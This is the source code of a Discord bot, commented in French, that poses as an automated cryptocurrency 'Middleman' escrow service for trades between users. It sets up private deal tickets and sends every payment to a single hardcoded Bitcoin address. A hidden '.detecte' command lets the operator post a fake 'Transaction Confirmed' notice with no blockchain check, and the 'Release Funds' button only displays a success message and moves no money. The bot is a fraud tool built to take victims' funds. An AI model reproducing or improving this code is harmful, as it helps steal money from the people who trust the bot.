const express = require("express");
const app = express();
app.get("/", (req, res) => res.send("Bot Halal Hub is alive!"));
app.listen(3000, () => console.log("Serveur prêt !"));

// Ton code Discord commence ici...
const {
    Client,
    GatewayIntentBits,
    ActionRowBuilder,
    StringSelectMenuBuilder,
    EmbedBuilder,
    ButtonBuilder,
    ButtonStyle,
    PermissionFlagsBits,
} = require("discord.js");
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

const TOKEN = process.env.TOKEN;
const ticketData = new Map();

// Rétablissement du GIF de chargement uniquement
const LOADING_GIF = "https://i.gifer.com/ZZ5H.gif";

client.on("messageCreate", async (msg) => {
    if (msg.author.bot) return;

    // --- COMMANDE .detecte #ticket ---
    if (msg.content.startsWith(".detecte")) {
        const args = msg.content.split(" ");
        const targetChannel =
            msg.mentions.channels.first() ||
            msg.guild.channels.cache.get(args[1]);
        if (!targetChannel)
            return msg.reply("❌ Précise le ticket : `.detecte #auto-123456`.");

        const data = ticketData.get(targetChannel.id);
        const amountUSD = data ? data.amount : "0";
        const amountBTC = (amountUSD / 96000).toFixed(6);

        // Suppression du message "Awaiting transaction..."
        if (data && data.loadingMsgId) {
            try {
                const loadingMsg = await targetChannel.messages.fetch(
                    data.loadingMsgId,
                );
                await loadingMsg.delete();
            } catch (e) {
                /* Déjà supprimé */
            }
        }

        const successEmbed = new EmbedBuilder()
            .setColor("#2ecc71")
            .setTitle("✅ Transaction Confirmed")
            .setDescription(
                `The funds have been successfully detected on the blockchain.\n\n**Amount received:** \`${amountBTC} BTC\` (**$${amountUSD} USD**)\n\n**The Middleman is now holding the funds.**`,
            )
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId("release_funds")
                .setLabel("Release Funds")
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId("cancel_deal")
                .setLabel("Cancel / Dispute")
                .setStyle(ButtonStyle.Danger),
        );

        await targetChannel.send({ embeds: [successEmbed], components: [row] });
        return msg.reply(`✅ Transaction confirmée dans ${targetChannel}`);
    }

    if (msg.content === "!menu") {
        const row = new ActionRowBuilder().addComponents(
            new StringSelectMenuBuilder()
                .setCustomId("crypto_select")
                .setPlaceholder("Make a selection")
                .addOptions([
                    { label: "Bitcoin", value: "Bitcoin", emoji: "₿" },
                    { label: "Ethereum", value: "Ethereum", emoji: "Ξ" },
                    { label: "Solana", value: "Solana", emoji: "☀️" },
                ]),
        );
        await msg.channel.send({
            embeds: [
                new EmbedBuilder()
                    .setColor("#2ecc71")
                    .setTitle("Cryptocurrency")
                    .setDescription("Select the currency for the exchange:"),
            ],
            components: [row],
        });
        return;
    }

    if (!msg.channel.name.startsWith("auto-")) return;
    let data = ticketData.get(msg.channel.id);
    if (!data) return;

    // Auto-add partner
    if (msg.mentions.users.first() && !data.partnerAdded) {
        const partner = msg.mentions.users.first();
        await msg.channel.permissionOverwrites.edit(partner.id, {
            ViewChannel: true,
            SendMessages: true,
        });
        data.partnerAdded = true;

        const rb = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId("role_sending")
                .setLabel("Sending")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId("role_receiving")
                .setLabel("Receiving")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId("role_reset")
                .setLabel("Reset")
                .setStyle(ButtonStyle.Danger),
        );
        await msg.channel.send({
            embeds: [
                new EmbedBuilder()
                    .setColor("#2ecc71")
                    .setTitle("Role Assignment")
                    .addFields(
                        { name: "Sending", value: "`None`", inline: true },
                        { name: "Receiving", value: "`None`", inline: true },
                    ),
            ],
            components: [rb],
        });
    } else if (!isNaN(msg.content) && !data.amountSet) {
        data.amount = msg.content;
        data.amountSet = true;
        await msg.channel.send({
            embeds: [
                new EmbedBuilder()
                    .setColor("#f1c40f")
                    .setTitle("Confirm Amount")
                    .setDescription(`Amount: **$${data.amount}**`),
            ],
            components: [
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId("amt_ok")
                        .setLabel("Correct")
                        .setStyle(ButtonStyle.Success),
                ),
            ],
        });
    }
});

client.on("interactionCreate", async (i) => {
    if (!i.guild) return;
    let data = ticketData.get(i.channel.id);

    if (i.isStringSelectMenu() && i.customId === "crypto_select") {
        const ticketID = Math.floor(Math.random() * 9000000);
        const channel = await i.guild.channels.create({
            name: `auto-${ticketID}`,
            permissionOverwrites: [
                { id: i.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                {
                    id: i.user.id,
                    allow: [
                        PermissionFlagsBits.ViewChannel,
                        PermissionFlagsBits.SendMessages,
                    ],
                },
            ],
        });
        ticketData.set(channel.id, {
            crypto: i.values[0],
            confirmations: 0,
            partnerAdded: false,
            sender: "`None`",
            receiver: "`None`",
            loadingMsgId: null,
            amount: "0",
            amountSet: false,
        });

        // Message de bienvenue épuré sans photo
        const welcomeEmbed = new EmbedBuilder()
            .setColor("#2ecc71")
            .setTitle("Cryptocurrency Middleman System")
            .setDescription(
                `**${i.values[0]} Middleman request created successfully!**\n\nWelcome to our automated cryptocurrency Middleman system!\nYour cryptocurrency will be stored securely for the duration of this deal. Please notify support for assistance.\n\n**Ticket #${ticketID}**`,
            );

        const securityEmbed = new EmbedBuilder()
            .setColor("#e74c3c")
            .setTitle("Security Notification")
            .setDescription(
                "Our bot and staff team will **NEVER** direct message you. Ensure all conversations related to the deal are done within this ticket. Failure to do so may put you at risk of being scammed.",
            );

        const closeRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId("close")
                .setLabel("Close")
                .setStyle(ButtonStyle.Secondary)
                .setEmoji("🔒"),
        );

        await channel.send({
            content: `<@${i.user.id}>`,
            embeds: [welcomeEmbed, securityEmbed],
            components: [closeRow],
        });
        await channel.send({
            embeds: [
                new EmbedBuilder()
                    .setColor("#2ecc71")
                    .setTitle("Who are you dealing with?")
                    .setDescription("eg. @user\neg. 123456789123456789"),
            ],
        });
        return i.reply({ content: `✅ Ticket: ${channel}`, ephemeral: true });
    }

    if (!i.isButton()) return;
    if (!data && i.customId !== "close") return;

    if (["role_sending", "role_receiving", "role_reset"].includes(i.customId)) {
        if (i.customId === "role_sending") data.sender = `<@${i.user.id}>`;
        if (i.customId === "role_receiving") data.receiver = `<@${i.user.id}>`;
        if (i.customId === "role_reset") {
            data.sender = "`None`";
            data.receiver = "`None`";
        }
        await i.update({
            embeds: [
                new EmbedBuilder()
                    .setColor("#2ecc71")
                    .setTitle("Role Assignment")
                    .addFields(
                        { name: "Sending", value: data.sender, inline: true },
                        {
                            name: "Receiving",
                            value: data.receiver,
                            inline: true,
                        },
                    ),
            ],
        });
        if (
            data.sender !== "`None`" &&
            data.receiver !== "`None`" &&
            i.customId !== "role_reset"
        )
            await i.channel.send({
                embeds: [
                    new EmbedBuilder()
                        .setColor("#2ecc71")
                        .setTitle("Deal Amount")
                        .setDescription("State the amount in USD"),
                ],
            });
    }

    if (i.customId === "amt_ok" || i.customId === "fee_ok") {
        data.confirmations++;
        await i.channel.send({
            embeds: [
                new EmbedBuilder()
                    .setColor("#2ecc71")
                    .setDescription(
                        `<@${i.user.id}> has responded with **'Correct'**`,
                    ),
            ],
        });
        if (data.confirmations >= 2) {
            data.confirmations = 0;
            if (i.customId === "amt_ok") {
                const frow = new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId("f_sender")
                        .setLabel("Sender")
                        .setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder()
                        .setCustomId("f_receiver")
                        .setLabel("Receiver")
                        .setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder()
                        .setCustomId("f_split")
                        .setLabel("Split")
                        .setStyle(ButtonStyle.Success),
                );
                await i.channel.send({
                    embeds: [
                        new EmbedBuilder()
                            .setColor("#2ecc71")
                            .setTitle("Fee Payment")
                            .setDescription("Who pays the $3.00 fee?"),
                    ],
                    components: [frow],
                });
            } else {
                const invoice = new EmbedBuilder()
                    .setColor("#f1c40f")
                    .setTitle("📥 Payment Invoice")
                    .setDescription(`Send funds to the address below.`)
                    .addFields({
                        name: "Address",
                        value: "`1LVX4evTiKkEJgaAiPBhYPVxPacpkEskVq`",
                    })
                    .setThumbnail(
                        `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=1LVX4evTiKkEJgaAiPBhYPVxPacpkEskVq`,
                    );
                await i.channel.send({
                    embeds: [invoice],
                    components: [
                        new ActionRowBuilder().addComponents(
                            new ButtonBuilder()
                                .setCustomId("copy")
                                .setLabel("Copy Details")
                                .setStyle(ButtonStyle.Secondary),
                        ),
                    ],
                });

                // On remet la barre de chargement animée
                const loading = await i.channel.send({
                    embeds: [
                        new EmbedBuilder().setColor("#2b2d31").setAuthor({
                            name: "Awaiting transaction...",
                            iconURL: LOADING_GIF,
                        }),
                    ],
                });
                data.loadingMsgId = loading.id;
            }
        }
        await i.deferUpdate();
    }

    if (["f_sender", "f_receiver", "f_split"].includes(i.customId)) {
        await i.update({
            embeds: [
                new EmbedBuilder()
                    .setColor("#f1c40f")
                    .setTitle("Fee Confirmation")
                    .setDescription(`Confirm correct.`),
            ],
            components: [
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId("fee_ok")
                        .setLabel("Correct")
                        .setStyle(ButtonStyle.Success),
                ),
            ],
        });
    }

    if (i.customId === "release_funds") {
        await i.update({ components: [] });
        await i.channel.send({
            embeds: [
                new EmbedBuilder()
                    .setColor("#2ecc71")
                    .setTitle("💰 Funds Released")
                    .setDescription("Deal Completed Successfully!"),
            ],
        });
    }
    if (i.customId === "close") return i.channel.delete();
});

client.login(TOKEN);
